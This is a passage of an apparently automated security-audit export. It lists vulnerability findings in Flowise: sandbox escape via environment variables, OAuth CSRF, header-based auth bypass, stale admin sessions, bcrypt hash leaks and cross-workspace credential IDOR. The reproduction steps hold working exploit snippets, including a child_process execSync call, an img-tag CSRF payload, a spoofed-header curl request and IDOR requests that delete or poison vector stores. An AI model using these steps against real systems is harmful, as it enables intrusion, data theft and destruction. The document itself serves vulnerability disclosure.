workspace/chamber-02/debate.md\n\n## Summary\n\nThe `TOOL_FUNCTION_BUILTIN_DEP` environment variable allows server operators to add Node.js built-in modules to the NodeVM sandbox's `require.builtin` allowlist. The value is split by comma and concatenated to the default safe list without any validation or filtering of module names. If an operator sets `TOOL_FUNCTION_BUILTIN_DEP=child_process,fs`, any JavaScript code node can call `require('child_process').exec(...)` to execute arbitrary OS commands from within the NodeVM sandbox, completely bypassing the sandbox's intended isolation without needing a vm2 CVE exploit.\n\n## Location\n\n- `packages/components/src/utils.ts:1741-1743` -- env var processing\n- `packages/components/src/utils.ts:126` -- default safe builtin list\n\n## Attacker Control\n\nThe env var is set by the server operator. Once set, any authenticated flow editor can create a code node that uses `require('child_process')` to execute OS commands. The code node's JavaScript is not validated for dangerous require() calls.\n\n## Trust Boundary Crossed\n\nNodeVM sandbox -\u003e host OS process execution via require('child_process'). The env var effectively opens a door through the sandbox boundary.\n\n## Impact\n\n- NodeVM sandbox bypass without vm2 CVE exploitation\n- Arbitrary OS command execution via require('child_process')\n- Arbitrary filesystem access via require('fs')\n- Requires operator misconfiguration (non-default)\n\n## Evidence\n\n1. No validation of module names:\n   ```typescript\n   // utils.ts:1741-1743\n   const builtinDeps = process.env.TOOL_FUNCTION_BUILTIN_DEP\n       ? defaultAllowBuiltInDep.concat(process.env.TOOL_FUNCTION_BUILTIN_DEP.split(','))\n       : defaultAllowBuiltInDep\n   ```\n\n2. Default safe list:\n   ```typescript\n   // utils.ts:126\n   export const defaultAllowBuiltInDep = ['assert', 'buffer', 'crypto', 'events', 'path', 'querystring', 'timers', 'url', 'zlib']\n   ```\n\n3. No denylist or allowlist filtering of the env var values.\n\n## Reproduction Steps\n\n1. Set `TOOL_FUNCTION_BUILTIN_DEP=child_process,fs` in the server environment.\n2. Restart the Flowise server.\n3. As an authenticated flow editor, create a CustomFunction node with:\n   ```javascript\n   const { execSync } = require('child_process');\n   return execSync('id').toString();\n   ```\n4. Trigger the chatflow. The code executes `id` on the host and returns the output.\n5. Without the env var, `require('child_process')` would throw an error because child_process is not in the default builtin allowlist.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"fb06b75581bdd509350f7a6a60c197cb","found_at":"2026-04-13T13:12:09.67676Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":363,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m7","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"allow-builtin-dep-browser-escape","description":"Phase: 8\nSequence: 026\nSlug: allow-builtin-dep-browser-escape\nVerdict: VALID\nRationale: ALLOW_BUILTIN_DEP=true exposes browser automation libraries (puppeteer, playwright) in NodeVM, enabling sandbox escape via subprocess launch, but requires explicit non-default operator configuration.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: check-4-ambiguous\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nWhen the `ALLOW_BUILTIN_DEP` environment variable is set to `'true'`, the NodeVM sandbox's external module allowlist is expanded to include all `availableDependencies`, which includes browser automation libraries like `puppeteer` and `playwright`. A code node can then `require('playwright')` to launch a Chromium subprocess that runs OUTSIDE the vm2 sandbox with full host OS access, effectively bypassing the sandbox entirely via a subprocess escape rather than a vm2 CVE exploit.\n\n## Location\n\n- `packages/components/src/utils.ts:1745` -- `deps = availableDependencies.concat(externalDeps)` when `ALLOW_BUILTIN_DEP === 'true'`\n\n## Attacker Control\n\nThe env var is set by the server operator. Once enabled, any authenticated flow editor can create a code node that imports puppeteer/playwright and launches a browser subprocess with host OS access.\n\n## Trust Boundary Crossed\n\nNodeVM sandbox -\u003e browser subprocess -\u003e host OS. The browser process runs outside the vm2 sandbox as a child process of the Node.js server, with access to the host filesystem and network.\n\n## Impact\n\n- vm2 sandbox bypass via browser automation subprocess\n- Chromium subprocess runs with host OS access (filesystem, network)\n- No vm2 CVE needed -- this is a design-level sandbox escape\n- Requires operator misconfiguration (non-default)\n\n## Evidence\n\n1. Env var gate and expansion:\n   ```typescript\n   // utils.ts:1745\n   let deps = process.env.ALLOW_BUILTIN_DEP === 'true' ? availableDependencies.concat(externalDeps) : externalDeps\n   ```\n\n2. `availableDependencies` includes puppeteer, playwright, and other powerful libraries that can spawn subprocesses.\n\n## Reproduction Steps\n\n1. Set `ALLOW_BUILTIN_DEP=true` in the server environment.\n2. Ensure puppeteer or playwright is installed (`npm install playwright`).\n3. Restart the Flowise server.\n4. As an authenticated flow editor, create a CustomFunction node with:\n   ```javascript\n   const { chromium } = require('playwright');\n   const browser = await chromium.launch();\n   const page = await browser.newPage();\n   // Browser subprocess has host OS access\n   const fs = require('fs'); // May also be available\n   return 'browser launched outside sandbox';\n   ```\n5. Trigger the chatflow. The Chromium subprocess launches outside the vm2 sandbox.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"f304d4060096901e68c90736d6443851","found_at":"2026-04-13T13:12:09.67676Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":360,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m4","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"bullmq-dashboard-missing-rbac","description":"Phase: 8\nSequence: 005\nSlug: bullmq-dashboard-missing-rbac\nVerdict: VALID\nRationale: BullMQ admin dashboard accessible to any authenticated user without role checks, exposing job queue internals and manipulation capabilities to low-privilege users in enterprise queue-mode deployments.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe BullMQ dashboard at `/admin/queues` is protected by `verifyTokenForBullMQDashboard` which validates JWT authentication only -- it performs no role or permission check. Any authenticated user, including those with the minimum MEMBER role, can access the Bull Board UI which exposes job queue internals: queue names, job counts, job payloads (containing chatflowIds, prediction inputs, overrideConfig data), worker status, and potentially allows job manipulation (retry, delete, pause) via the Bull Board interface.\n\n## Location\n\n- **Route handler**: `packages/server/src/enterprise/middleware/passport/index.ts:437-463` -- `verifyTokenForBullMQDashboard`\n- **Missing RBAC**: No `checkPermission()` middleware applied to the `/admin/queues` route\n- **Condition**: Only active when `MODE=queue \u0026\u0026 ENABLE_BULLMQ_DASHBOARD=true \u0026\u0026 !isCloud()`\n\n## Attacker Control\n\nAny authenticated user with a valid JWT cookie can access `/admin/queues`. No additional permissions or role are required.\n\n## Trust Boundary Crossed\n\nMember-to-admin operational boundary: the BullMQ dashboard is an administrative tool that should be restricted to admins/operators, not accessible to all authenticated users.\n\n## Impact\n\n- **Information disclosure**: Job queue names, counts, payloads (which may contain chatflow configurations, user inputs, API keys in overrideConfig)\n- **Job manipulation**: Bull Board UI allows retrying, deleting, and pausing jobs\n- **Operational disruption**: Pausing queues or deleting jobs could disrupt service\n\n## Evidence\n\n```typescript\n// passport/index.ts:437-463\nexport const verifyTokenForBullMQDashboard = (req: Request, res: Response, next: NextFunction) =\u003e {\n    passport.authenticate('jwt', { session: true }, (err: any, user: LoggedInUser, info: object) =\u003e {\n        // ... JWT validation only ...\n        // NO checkPermission() call\n        // NO user.isOrganizationAdmin check\n        req.user = user\n        next()\n    })(req, res, next)\n}\n```\n\n## Reproduction Steps\n\n1. Deploy Flowise in enterprise queue mode with `MODE=queue` and `ENABLE_BULLMQ_DASHBOARD=true`\n2. Create a user with MEMBER role (minimum permissions)\n3. Log in as the MEMBER user to obtain JWT and session cookies\n4. Navigate to `/admin/queues` in the browser\n5. Observe full access to the Bull Board dashboard with queue visibility and job manipulation controls\n6. Confirm that no permission error is returned\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"1ea1e4548d04966e903cf4939e45bd62","found_at":"2026-04-13T13:12:09.676759Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":361,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m5","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"sso-oauth-missing-state-csrf","description":"Phase: 8\nSequence: 009\nSlug: sso-oauth-missing-state-csrf\nVerdict: VALID\nRationale: All three SSO providers lack state parameter CSRF protection per RFC 6749 S10.12, enabling OAuth login CSRF attacks that link a victim's session to the attacker's account when SSO is configured.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe Google, Azure, and GitHub SSO callback handlers do not implement `state` parameter CSRF protection as required by RFC 6749 Section 10.12. None of the three SSO strategies set `{ state: true }` in their passport configuration, and no `state` parameter is verified on the callback. An attacker can craft a malicious page that delivers an OAuth authorization code (from the attacker's own OAuth flow) to the victim's Flowise SSO callback URL. Without state validation, the callback completes and authenticates the victim as the attacker's SSO-linked account.\n\n## Location\n\n- **Google SSO**: `packages/server/src/enterprise/sso/GoogleSSO.ts:77-115` -- no state in auth request, no state verification on callback\n- **Azure SSO**: `packages/server/src/enterprise/sso/AzureSSO.ts:28-65` -- same pattern\n- **GitHub SSO**: `packages/server/src/enterprise/sso/GithubSSO.ts:59-99` -- same pattern\n\n## Attacker Control\n\nThe attacker controls the authorization code submitted to the callback URL. They obtain this code from their own OAuth flow with the SSO provider, then deliver it to the victim via a crafted webpage or link.\n\n## Trust Boundary Crossed\n\nSession integrity boundary: the victim's browser session is linked to the attacker's OAuth identity without the victim's consent or awareness.\n\n## Impact\n\n- **Session hijacking (reverse)**: Victim is logged into the attacker's account; attacker observes victim actions\n- **Account linkage confusion**: In multi-user environments, organizational boundaries are compromised\n- **All three SSO providers affected**: Google, Azure AD, GitHub\n\n## Evidence\n\n```typescript\n// GoogleSSO.ts:77-82 -- no state parameter\nthis.app.get(GoogleSSO.LOGIN_URI, (req, res, next?) =\u003e {\n    passport.authenticate('google', async () =\u003e {\n        if (next) next()\n    })(req, res, next)\n})\n\n// GoogleSSO.ts:86-115 -- no state verification\nthis.app.get(GoogleSSO.CALLBACK_URI, (req, res, next?) =\u003e {\n    passport.authenticate('google', async (err: any, user: LoggedInUser) =\u003e {\n        // No req.query.state validation\n    })(req, res, next)\n})\n```\n\n## Reproduction Steps\n\n1. Configure SSO (e.g., Google) on the Flowise instance\n2. As the attacker, initiate an SSO login flow and capture the authorization code before it is consumed\n3. Craft an HTML page that auto-submits the captured code to the victim's Flowise callback:\n   ```html\n   \u003cimg src=\"https://flowise.example.com/api/v1/google/callback?code=ATTACKER_CODE\"\u003e\n   ```\n4. When the victim visits the attacker's page while having an active Flowise session, the callback processes the attacker's code\n5. The victim is now logged into the attacker's SSO-linked account\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"077fd96532b6f84ef5cb6f11de34703a","found_at":"2026-04-13T13:12:09.676759Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":359,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m3","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"role-demotion-session-persistence","description":"Phase: 8\nSequence: 004\nSlug: role-demotion-session-persistence\nVerdict: VALID\nRationale: Session-cached isOrganizationAdmin flag persists after role demotion because destroyAllSessionsForUser is not called on role change paths, creating a privilege persistence window bounded only by session expiry.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nWhen an organization admin's role is downgraded (e.g., from Owner to Member), the `isOrganizationAdmin` flag cached in their Express session is not invalidated. The `checkPermission()` middleware checks `user.isOrganizationAdmin` first and bypasses ALL RBAC permission checks when true. Since `destroyAllSessionsForUser()` is only called during password reset and email/password changes -- not during role changes -- the demoted user retains full admin-equivalent API access for the lifetime of their session. This also applies to account deactivation, which similarly fails to invalidate sessions.\n\n## Location\n\n- **RBAC bypass**: `packages/server/src/enterprise/rbac/PermissionCheck.ts:10` -- `if (user.isOrganizationAdmin) return next()`\n- **Session caching**: `packages/server/src/enterprise/middleware/passport/index.ts:183` -- `isOrganizationAdmin: workspaceUser.roleId === ownerRole.id`\n- **Session invalidation (limited)**: `packages/server/src/enterprise/services/account.service.ts:695` (resetPassword only) and `packages/server/src/enterprise/services/user.service.ts:208` (password/email change only)\n- **Missing invalidation**: workspace-user.service.ts, role.service.ts, organization-user.service.ts -- no `destroyAllSessionsForUser()` calls\n\n## Attacker Control\n\nA user who was previously an organization admin (a legitimate state) has their role changed by another admin. The previously-admin user does not need to take any special action -- their existing session simply retains the cached admin flag.\n\n## Trust Boundary Crossed\n\nRBAC boundary: a MEMBER-role user exercises OWNER-role privileges via stale session state.\n\n## Impact\n\n- **Full RBAC bypass**: `isOrganizationAdmin: true` skips ALL permission checks in `checkPermission()` and `checkAnyPermission()`\n- **Privilege persistence window**: Hours to days depending on session configuration\n- **Undetectable**: No audit trail distinguishes a legitimate admin action from a stale-session action\n- **Account deactivation bypass**: Same mechanism allows deactivated users to continue accessing the platform\n\n## Evidence\n\n```typescript\n// PermissionCheck.ts:5-20\nexport const checkPermission = (permission: string) =\u003e {\n    return (req: Request, res: Response, next: NextFunction) =\u003e {\n        const user = req.user\n        if (user) {\n            if (user.isOrganizationAdmin) {\n                return next()  // \u003c-- bypasses ALL permission checks\n            }\n            // ...\n        }\n    }\n}\n\n// passport/index.ts:183 -- set at login, stored in session\nisOrganizationAdmin: workspaceUser.roleId === ownerRole.id,\n\n// destroyAllSessionsForUser is NOT called in role change services\n// Only called in: account.service.ts:695 (resetPassword), user.service.ts:208 (password/email change)\n```\n\n## Reproduction Steps\n\n1. Create two admin users (Admin-A and Admin-B)\n2. Admin-A logs in and confirms admin access (e.g., can create workspaces, manage users)\n3. Admin-B demotes Admin-A to MEMBER role\n4. Admin-A (without logging out) continues making admin-level API calls\n5. Observe that all requests succeed because `isOrganizationAdmin: true` persists in the session\n6. Confirm that the session retains admin privileges until it expires or Admin-A logs out\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"e09e846fd6100e2d8e2f29ecc36eec58","found_at":"2026-04-13T13:12:09.676758Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":358,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m2","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"x-request-from-auth-bypass","description":"Phase: 8\nSequence: 003\nSlug: x-request-from-auth-bypass\nVerdict: VALID\nRationale: Client-controlled HTTP header bypasses API key validation and URL blacklist checks for authenticated users; while JWT+session requirement limits scope, the header is trivially spoofable and the blacklist bypass removes intentional access controls.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe authentication middleware at `index.ts:226` trusts the `x-request-from: internal` HTTP header to switch from API key validation to JWT-only authentication. Since any HTTP client can set arbitrary headers, an authenticated browser user can bypass API key validation and -- critically -- skip the `API_KEY_BLACKLIST_URLS` check that restricts access to sensitive endpoints (`/api/v1/nvidia-nim`, `/api/v1/account/delete`). This converts an intended API-key-scoped access model into unrestricted JWT-session access.\n\n## Location\n\n- **Primary**: `packages/server/src/index.ts:226-227` -- `x-request-from: internal` branch\n- **Blacklist skip**: `packages/server/src/index.ts:229-232` -- `API_KEY_BLACKLIST_URLS` check is in the `else` branch, not reached when `x-request-from: internal` is set\n- **Token verification**: `packages/server/src/enterprise/middleware/passport/index.ts:409-434` -- `verifyToken()` validates JWT+session\n\n## Attacker Control\n\nAny HTTP client sets `x-request-from: internal` header. The attacker must also have valid JWT and session cookies (authenticated browser session). The header value is not validated against any origin or network source.\n\n## Trust Boundary Crossed\n\nAPI key scope boundary: API keys are issued with specific permissions and workspace bindings. The x-request-from bypass shifts to JWT-session scope, which may have broader access. The URL blacklist is a deliberate access control that is completely bypassed.\n\n## Impact\n\n- **Blacklist bypass**: Authenticated users can reach `/api/v1/nvidia-nim` and `/api/v1/account/delete` endpoints that are intentionally blacklisted for API key access\n- **Scope escalation**: JWT sessions may have different (broader) permissions than the API key that would otherwise be required\n- **Secondary protections**: `/api/v1/account/delete` has a service-layer `Platform.CLOUD` guard; `/api/v1/nvidia-nim` protections not verified\n\n## Evidence\n\n```typescript\n// index.ts:219-279\nif (isWhitelisted) {\n    next()\n} else if (req.headers['x-request-from'] === 'internal') {\n    verifyToken(req, res, next)  // JWT only -- no API key, no blacklist check\n} else {\n    const isAPIKeyBlacklistedURLS = API_KEY_BLACKLIST_URLS.some(...)  // SKIPPED\n    // ... validateAPIKey() ... // SKIPPED\n}\n```\n\n## Reproduction Steps\n\n1. Authenticate via browser to obtain JWT cookie and session cookie\n2. Using the browser's developer tools or curl with the cookies, send a request to a blacklisted endpoint:\n   ```\n   curl -X GET https://flowise.example.com/api/v1/nvidia-nim \\\n     -H \"x-request-from: internal\" \\\n     -b \"token=\u003cjwt_cookie\u003e; connect.sid=\u003csession_cookie\u003e\"\n   ```\n3. Observe that the request bypasses API key validation and the blacklist check\n4. Compare with a request without the header, which would require an API key and would be blocked by the blacklist\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"a425394469d5860ae32162e0d12d09ac","found_at":"2026-04-13T13:12:09.676756Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":356,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h21","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"openai-assistants-vectorstore-credential-idor","description":"Phase: 10\nSequence: 042\nSlug: openai-assistants-vectorstore-credential-idor\nVerdict: VALID\nRationale: All seven functions in the openai-assistants-vector-store service fetch Credential entities using only the attacker-supplied req.query.credential without a workspaceId filter, allowing cross-workspace OpenAI vector store manipulation using victim API keys.\nSeverity-Original: HIGH\nPoC-Status: pending\nOrigin-Finding: archon/findings-draft/p8-040-docstore-query-idor-ssrf.md\nOrigin-Pattern: AP-040\n\n## Summary\n\nSeven functions in the `openai-assistants-vector-store` service all share the same IDOR pattern: `credentialId` from `req.query.credential` is passed to `Credential.findOneBy({ id: credentialId })` without a `workspaceId` predicate. This grants an authenticated attacker full CRUD access to any workspace's OpenAI vector stores, including file upload and deletion, using only a known Credential UUID.\n\n## Location\n\n- Service: `packages/server/src/services/openai-assistants-vector-store/index.ts`\n  - Line 13-14: `getAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 40-41: `listAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 67-68: `createAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 98-99: `updateAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 134-135: `deleteAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 165-166: `uploadFilesToAssistantVectorStore` — `findOneBy({ id: credentialId })`\n  - Line 218-219: `deleteFilesFromAssistantVectorStore` — `findOneBy({ id: credentialId })`\n- Controller: `packages/server/src/controllers/openai-assistants-vector-store/index.ts` — all handlers pass `req.query.credential as string` directly, no workspaceId validation\n- Route: `packages/server/src/routes/openai-assistants-vector-store/index.ts` — RBAC checks for `assistants:view/create/update/delete` only, no ownership check on credential\n\n## Attacker Control\n\n1. `req.query.credential` — attacker supplies any Credential UUID from any workspace\n2. `req.params.id` — attacker supplies OpenAI vector store ID to target specific victim resources\n3. `req.body` — attacker controls vector store creation/update parameters and file IDs for deletion\n\n## Trust Boundary Crossed\n\nWorkspace A authenticated user reads, creates, modifies, and deletes OpenAI vector stores and their files belonging to Workspace B's OpenAI account, using Workspace B's decrypted API key.\n\n## Impact\n\n- **Cross-workspace vector store read**: Attacker lists all vector stores in the victim OpenAI account and retrieves their metadata\n- **Destructive operations**: Attacker can delete any vector store or individual files from victim's OpenAI account using `deleteAssistantVectorStore` and `deleteFilesFromAssistantVectorStore`\n- **Data injection**: Attacker can upload arbitrary files into victim's OpenAI vector stores via `uploadFilesToAssistantVectorStore`, polluting vector search results (RAG poisoning)\n- **Create/update**: Attacker can create new vector stores billed to the victim's OpenAI account, or modify existing ones\n- **API key abuse**: All operations consume the victim workspace's OpenAI quota\n\n## Evidence\n\n```typescript\n// services/openai-assistants-vector-store/index.ts:13-14 (repeated in all 7 functions)\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: credentialId   // from req.query.credential — no workspaceId filter\n})\n// decryption and API usage follows in every function\nconst openAIApiKey = decryptedCredentialData['openAIApiKey']\nconst openai = new OpenAI({ apiKey: openAIApiKey })\n// victim's OpenAI account is now fully accessible\n```\n\nThe pattern is identical across all 7 service functions. The same `Credential` entity model is correctly workspace-scoped in `credentials/index.ts:130-132` (`findOneBy({ id: credentialId, workspaceId })`), confirming the missing filter is an oversight.\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A (must have `assistants:view` permission)\n2. Obtain a Credential UUID from Workspace B (via enumeration or other IDOR findings)\n3. List victim's vector stores:\n   ```\n   GET /api/v1/openai-assistants-vector-store?credential=\u003cworkspace-B-credential-uuid\u003e\n   Authorization: Bearer \u003cworkspace-A-token\u003e\n   ```\n4. Delete a vector store from victim's OpenAI account:\n   ```\n   DELETE /api/v1/openai-assistants-vector-store/\u003cvectorStoreId\u003e?credential=\u003cworkspace-B-credential-uuid\u003e\n   Authorization: Bearer \u003cworkspace-A-token\u003e\n   ```\n5. Upload attacker-controlled files to victim's vector store (RAG poisoning):\n   ```\n   POST /api/v1/openai-assistants-vector-store/\u003cvectorStoreId\u003e?credential=\u003cworkspace-B-credential-uuid\u003e\n   Authorization: Bearer \u003cworkspace-A-token\u003e\n   Content-Type: multipart/form-data; files=\u003cmalicious-file\u003e\n   ```\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"26eb419bafeb0cc1ae129c4827bb0948","found_at":"2026-04-13T13:12:09.676755Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":357,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:m1","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"login-credential-hash-leak","description":"Phase: 8\nSequence: 002\nSlug: login-credential-hash-leak\nVerdict: VALID\nRationale: Authenticated legacy login endpoint leaks bcrypt hash in response body; while requiring credentials limits direct exploitation, log systems persist the hash for months/years creating a durable credential exposure surface.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe `/api/v1/account/login` legacy endpoint returns the full User entity including the `credential` field (bcrypt password hash) in the HTTP response body upon successful authentication. Unlike the safe `/api/v1/auth/login` endpoint which constructs a `LoggedInUser` object excluding credentials, this endpoint directly serializes the TypeORM entity. The primary risk is log-based credential exposure: proxy logs, WAF logs, SIEM systems, and APM tools that capture HTTP response bodies will persist the bcrypt hash.\n\n## Location\n\n- **Primary**: `packages/server/src/enterprise/services/account.service.ts:538-589` -- `login()` method returns `{ user, workspaceDetails }` with `user.credential` intact\n- **Controller**: `packages/server/src/enterprise/controllers/account.controller.ts:34-38` -- serializes to JSON response\n- **Safe counterpart**: `packages/server/src/enterprise/middleware/passport/index.ts:272+` -- `/api/v1/auth/login` uses `LoggedInUser` construction (safe)\n\n## Attacker Control\n\nAn authenticated user calling the legacy login endpoint receives their own bcrypt hash. An attacker with access to log systems (insider, compromised logging infrastructure) can harvest hashes for any user who has used this endpoint.\n\n## Trust Boundary Crossed\n\nServer-side database credential crosses to HTTP response body. While the endpoint requires authentication, the credential hash should never be included in API responses.\n\n## Impact\n\n- **Log-based exposure**: HTTP response bodies in proxy/WAF/SIEM logs persist bcrypt hashes for extended periods\n- **Credential harvesting**: Access to log infrastructure enables bulk hash collection\n- **Offline cracking**: Weak password hashes recoverable via hashcat/JohnTheRipper\n\n## Evidence\n\n```typescript\n// account.service.ts:538-589\npublic async login(data: AccountDTO) {\n    const user = await this.userService.readUserByEmail(data.user.email, queryRunner)\n    // ... password validation ...\n    return { user, workspaceDetails: wsUserOrUsers }  // user.credential included\n}\n\n// account.controller.ts:34-38\npublic async login(req: Request, res: Response, next: NextFunction) {\n    const data = await accountService.login(req.body)\n    return res.status(StatusCodes.CREATED).json(data)  // credential in response\n}\n```\n\n## Reproduction Steps\n\n1. Create and verify a user account\n2. POST to `/api/v1/account/login` with valid `{\"user\": {\"email\": \"...\", \"credential\": \"...\"}}`\n3. Observe the response body contains `data.user.credential` with the bcrypt hash\n4. Compare with POST to `/api/v1/auth/login` which does NOT leak the credential\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"flowiseai/flowise","finding_hash":"c95f61f63df8b95077224a9fa6366caf","found_at":"2026-04-13T13:12:09.676755Z","created_at":"2026-04-13T13:12:09Z"}},{"type":"finding","data":{"id":354,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"2fa53224-e918-406e-999d-ee1fc63fa7e1","module_id":"archon:h19","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"openai-assistants-cred-idor","description":"Phase: 10\nSequence: 041-003\nSlug: openai-assistants-cred-idor\nVerdict: VALID\nRationale: The openai-assistants and openai-assistants-vector-store service functions (9+ affected call sites) accept a credential UUID with no workspaceId filter, decrypt the API key, and use it to enumerate or mutate the victim's OpenAI account assets, including assistants, files, and vector stores.\nSeverity-Original: HIGH\nPoC-Status: pending\nOrigin-Finding: archon/findings-draft/p8-041-docstore-tooldesc-idor-exfil.md\nOrigin-Pattern: AP-040\n\n## Summary\n\nEvery function in `openai-assistants` and `openai-assistants-vector-store` services performs `Credential.findOneBy({ id: credentialId })` without a workspaceId filter. The credentialId comes directly from the HTTP request (query param `credential`). An authenticated user in Workspace A can supply any credential UUID from Workspace B to:\n- List all OpenAI assistants registered under victim's API key\n- Retrieve a specific assistant's configuration, files, and vector store contents\n- Create, update, and delete vector stores against the victim's API key\n- Upload and delete files in the victim's OpenAI account\n- Cause financial harm by consuming victim's API quota\n\nThis is the same root cause as AP-040 (no workspaceId filter on credential lookup) but manifests across all OpenAI Assistants management endpoints with write primitives.\n\n## Location\n\n**openai-assistants service** (`packages/server/src/services/openai-assistants/index.ts`):\n- Line 18: `getAllOpenaiAssistants` -- `findOneBy({ id: credentialId })` no workspace filter; calls `openai.beta.assistants.list()`\n- Line 46: `getSingleOpenaiAssistant` -- same pattern; additionally calls `openai.vectorStores.retrieve()`, `openai.files.list()`\n- Line 87: `uploadFilesToAssistant` -- same pattern; calls `openai.files.create()`\n\n**openai-assistants-vector-store service** (`packages/server/src/services/openai-assistants-vector-store/index.ts`):\n- Line 13: `getAssistantVectorStore` -- no workspace filter; reads vector store content\n- Line 40: `listAssistantVectorStore` -- no workspace filter; lists all vector stores\n- Line 67: `createAssistantVectorStore` -- no workspace filter; creates vector store against victim's API key\n- Line 98: `updateAssistantVectorStore` -- no workspace filter; modifies vector store\n- Line 134: `deleteAssistantVectorStore` -- no workspace filter; deletes vector store\n- Line 165/218: `uploadFilesToAssistantVectorStore` / `deleteFilesFromAssistantVectorStore` -- same pattern\n\nControllers pass credential directly from `req.query.credential` to these service functions without workspace validation.\n\n## Attacker Control\n\n1. `req.query.credential` -- any credential UUID from any workspace (no workspaceId enforcement anywhere in the call chain)\n2. `req.params.id` (get/update/delete operations) -- any OpenAI vector store or assistant ID\n\n## Trust Boundary Crossed\n\nWorkspace A user decrypts and uses Workspace B's OpenAI API key to read, write, and delete OpenAI account resources owned by Workspace B, crossing both the workspace trust boundary and the external API trust boundary.\n\n## Impact\n\n- **Cross-workspace OpenAI account enumeration**: Attacker retrieves full list of victim's OpenAI Assistants and their configurations (instructions, tools, models)\n- **File and vector store data disclosure**: Attacker retrieves file metadata and vector store contents indexed under victim's account\n- **Destructive write access**: Attacker can delete victim's OpenAI vector stores and files, causing data loss\n- **API quota consumption and financial harm**: All API calls are billed against victim's OpenAI quota\n- **Persistent access via file upload**: Attacker can upload malicious files to victim's OpenAI account storage\n\n## Evidence\n\n```typescript\n// openai-assistants/index.ts:18-20 -- same pattern repeated 9+ times\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: credentialId  // NO workspaceId filter — any UUID accepted\n})\nconst decryptedCredentialData = await decryptCredentialData(credential.encryptedData)\nconst openAIApiKey = decryptedCredentialData['openAIApiKey']\n\n// DELETE operation in openai-assistants-vector-store/index.ts:134-137\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\n    id: credentialId  // attacker-controlled UUID\n})\n// ... decrypts victim's API key ...\nawait openai.vectorStores.del(vectorStoreId)  // destroys victim's data\n```\n\n## Reproduction Steps\n\n1. Authenticate as User A in Workspace A\n2. Obtain a credential UUID from Workspace B (via p8-044 public config IDOR or other discovery)\n3. **Read**: `GET 